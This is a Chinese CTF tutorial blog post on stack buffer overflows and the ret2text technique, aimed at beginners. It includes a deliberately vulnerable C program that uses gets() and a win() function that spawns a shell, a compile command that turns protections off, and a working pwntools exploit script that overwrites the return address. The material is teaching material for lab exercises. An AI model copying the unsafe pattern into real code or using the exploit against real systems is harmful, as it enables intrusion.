---
title: CTF Pwn 入门：栈溢出与 ret2text 的第一束光
description: 用 ret2text 打通 Pwn 的第一关——理解栈帧、覆盖返回地址，让程序跳去它本不想去的地方。
date: 2026-10-04
tags: [CTF, Pwn]
---

## 先认识栈：函数调用的足迹

x86 下函数调用时栈从高地址向低地址生长，一个典型栈帧：

```
高地址
┌──────────────────────┐
│   返回地址            │  ← call 时压入
├──────────────────────┤
│   保存的 ebp          │
├──────────────────────┤
│   局部变量 buf[32]    │  ← esp 平时指着这里附近
└──────────────────────┘
低地址
```

`gets`/`scanf` 不检查长度，于是从 `buf` 开始往后写，可以依次覆盖 **保存的 ebp**、再覆盖 **返回地址**。返回地址一旦被改写，`ret` 就会把 CPU 带去我指定的地方——这就是 Pwn 第一课的全部浪漫。

## 题目骨架

```c
void win() { system("/bin/sh"); }

int main() {
    char buf[32];
    puts("What's your name?");
    gets(buf);          // 经典不安全函数
    printf("Hello, %s\n", buf);
}
```

编译时关掉保护，方便第一次尝鲜：

```bash
gcc -m32 -fno-stack-protector -no-pie -z execstack pwn1.c -o pwn1
```

## 三步打通

1. **找溢出偏移**：GDB 里用 pattern 崩一次，看 `eip` 落在 pattern 的第几个字符；
2. **找 win 地址**：`objdump -d pwn1 | grep win` 或 `pwndbg> info address win`；
3. **构造 payload**：填充到返回地址 + 覆盖成 win。

```python
from pwn import *

p = process('./pwn1')
OFFSET = 44            # buf(32) + 保存的 ebp(4) + 对齐 —— 以 pattern 实测为准
win_addr = 0x080491f6

payload = b'A' * OFFSET + p32(win_addr)
p.recvuntil(b'name?')
p.sendline(payload)
p.interactive()
```

> pwndbg 先跑 `checksec`：FULL RELRO / Canary / NX / PIE，每一层保护都对应后面不同的进阶打法（ret2csu、one_gadget……），ret2text 是裸奔局。

## 为什么是 44 而不是 36

`buf` 只有 32 字节，但栈对齐会插入填充。**偏移必须以 pattern 实崩为准，永远不要心算栈布局**——这是本笔记用血泪换成的第一定律。

## 下一步

- [ ] 开了 Canary 怎么办：先泄露（ret2puts）
- [ ] 64 位 ret2text：rdi 传参的 `pop rdi; ret` gadget
- [ ] one_gadget 与栈迁移
